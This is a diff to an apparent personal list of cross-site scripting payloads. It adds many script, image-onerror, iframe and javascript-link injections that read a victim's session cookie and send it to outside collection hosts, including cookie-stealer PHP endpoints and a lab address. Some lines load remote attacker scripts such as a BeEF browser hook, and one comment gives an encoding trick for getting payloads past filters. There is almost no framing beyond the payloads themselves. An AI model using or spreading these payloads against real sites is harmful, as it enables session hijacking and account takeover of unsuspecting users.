@@ -1,5 +1,8 @@
 <script> var i=new Image(); i.src="https://site.com/server.php?a="escape(document.cookie)</scrpit>
 
+<script type="text/javascript">document.location='https://YOURWEBSITE.COM/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));</script>
+<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
+"><script>document.location="http://YOUR_IP/cookie/" + document.cookie </script>
 
 ><script>alert(document.cookie);var x=new XMLHttpRequest();x.open("GET","https://localhost.com/server.php?a="+document.cookie);x.send();</script>
 
@@ -7,6 +10,45 @@
 
 
 "><img src="aaa" onerror=(document.location)="https://localhost.com/server.php?a="+(document.cookie)>';</script>
+
+<script>
+document.location= "http://www.example.com/c.php?c=" + document.cookie
+</script>
+
+<script>
+new Image().src="http://www.example.com/c.php?c="+encodeURI(document.cookie);
+</script>
+
+<a href="javascript:document.location='http://www.example.com/c.php?c='+document.cookie;">Click here!</a>
+
+<script>
+document.write("<img src=http://www.examplesdfdf.com/c.php?c="+ document.cookie+">");
+</script>
+
+<script>
+document.write("<img src=http://example.com/c.php?c="+ escape(document.cookie) + ">");  
+</script>
+
+
+<iframe frameborder=1 src="" height=0 width=0 id="XSS" name="XSS" > </iframe>
+<script>
+frames["XSS"].location.href="http://example.com/c.php?c=" + document.cookie;
+</script>
+
+<img src="https://www.google.com/favicon.ico" onload="src='http://example.com/c.php?c='+document.cookie" >
+
+<img src=1 onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"
+****this is not testing yet ********
+
+
+<img onload="var s = document.createElement('script'); s.src='http://evil-site/beef/hook/beefmagic.js.php';document.getElementsByTagName('head')[0].appendChild(s);" src="real_image.jpg" />
+****this is not testing yet ********
+
+/* + is sometimes taking as space instead of concatenation then you have to use %2B */
+<script> new Image().src="http://192.168.0.2/dvwa/c.php?c="%2B encodeURI(document.cookie)%2B" -ReferrerURI- " %2B encodeURI(document.referrer); </script>
+<script> new Image().src="http://192.168.0.2/dvwa/c.php?c="+encodeURI(document.cookie)+" -ReferrerURI-" + encodeURI(document.referrer); </script>
+
+
 
 "><img src="aaa" onerror="alert(document.cookie)">
 "><img src=aaa onerror="alert(document.cookie)">
